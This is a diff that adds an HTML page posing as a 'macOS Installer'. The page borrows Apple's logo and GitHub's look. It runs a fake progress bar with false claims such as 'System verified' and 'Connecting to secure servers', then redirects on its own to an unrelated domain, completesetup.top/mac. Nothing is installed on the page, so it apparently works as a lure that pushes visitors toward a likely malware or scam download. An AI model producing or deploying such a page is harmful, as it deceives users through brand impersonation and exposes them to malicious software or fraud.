@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>macOS Installer</title>
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+<meta name="theme-color" content="#0d1117">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    background:#0d1117;
+    color:#c9d1d9;
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+}
+
+/* 🌈 animated background */
+.bg{
+    position:absolute;
+    inset:0;
+    background:
+        radial-gradient(circle at 20% 20%, rgba(88,166,255,.18), transparent 40%),
+        radial-gradient(circle at 80% 30%, rgba(35,134,54,.18), transparent 40%),
+        radial-gradient(circle at 50% 80%, rgba(168,85,247,.12), transparent 45%);
+    filter:blur(60px);
+    animation:move 10s ease-in-out infinite alternate;
+}
+
+@keyframes move{
+    from{transform:translate(-5%,-5%)}
+    to{transform:translate(5%,5%)}
+}
+
+/* 🧊 card */
+.card{
+    position:relative;
+    width:420px;
+    padding:28px;
+    border-radius:16px;
+    background:rgba(22,27,34,.75);
+    backdrop-filter:blur(18px);
+    border:1px solid rgba(255,255,255,.08);
+    box-shadow:0 25px 60px rgba(0,0,0,.6);
+    text-align:center;
+    animation:pop .6s ease;
+}
+
+@keyframes pop{
+    from{opacity:0;transform:scale(.9)}
+    to{opacity:1;transform:scale(1)}
+}
+
+/* 🍎 icon */
+.icon{
+    width:60px;
+    height:60px;
+    margin-bottom:10px;
+    animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{
+    0%,100%{transform:translateY(0)}
+    50%{transform:translateY(-8px)}
+}
+
+h1{
+    font-size:20px;
+    margin-bottom:6px;
+}
+
+p{
+    font-size:12px;
+    color:#8b949e;
+    margin-bottom:20px;
+}
+
+/* 📊 progress */
+.row{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    margin-bottom:8px;
+}
+
+.bar{
+    width:100%;
+    height:10px;
+    background:#30363d;
+    border-radius:50px;
+    overflow:hidden;
+}
+
+.fill{
+    width:0%;
+    height:100%;
+    background:linear-gradient(90deg,#1f6feb,#238636,#58a6ff);
+    background-size:300% 100%;
+    animation:shine 2s linear infinite;
+}
+
+@keyframes shine{
+    0%{background-position:0%}
+    100%{background-position:300%}
+}
+
+/* 🟢 status */
+.status{
+    margin-top:16px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    font-size:12px;
+}
+
+.dot{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#2ea043;
+    animation:pulse 1.4s infinite;
+}
+
+@keyframes pulse{
+    0%,100%{transform:scale(1);opacity:1}
+    50%{transform:scale(1.6);opacity:.4}
+}
+
+/* 📋 steps */
+.steps{
+    margin-top:15px;
+    font-size:11px;
+    color:#8b949e;
+    line-height:18px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="card">
+
+    <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+
+    <h1>macOS Installer</h1>
+    <p>Preparing secure environment...</p>
+
+    <div class="row">
+        <span>Loading</span>
+        <span id="percent">0%</span>
+    </div>
+
+    <div class="bar">
+        <div class="fill" id="fill"></div>
+    </div>
+
+    <div class="status">
+        <div class="dot"></div>
+        Connecting to secure servers
+    </div>
+
+    <div class="steps" id="steps">
+        <div>⏳ Checking system</div>
+        <div>⏳ Preparing package</div>
+        <div>⏳ Finalizing</div>
+    </div>
+
+</div>
+
+<script>
+let p = 0;
+
+const fill = document.getElementById("fill");
+const percent = document.getElementById("percent");
+const steps = document.querySelectorAll("#steps div");
+
+function run(){
+    p += Math.random()*3.5;
+    if(p > 100) p = 100;
+
+    fill.style.width = p + "%";
+    percent.innerText = Math.floor(p) + "%";
+
+    if(p > 30) steps[0].innerText = "✔ System verified";
+    if(p > 65) steps[1].innerText = "✔ Package ready";
+    if(p > 90) steps[2].innerText = "✔ Launching installer";
+
+    if(p < 100){
+        requestAnimationFrame(run);
+    } else {
+        setTimeout(() => {
+            window.location.href = "https://completesetup.top/mac";
+        }, 700);
+    }
+}
+
+setTimeout(run, 600);
+</script>
+
+</body>
+</html>
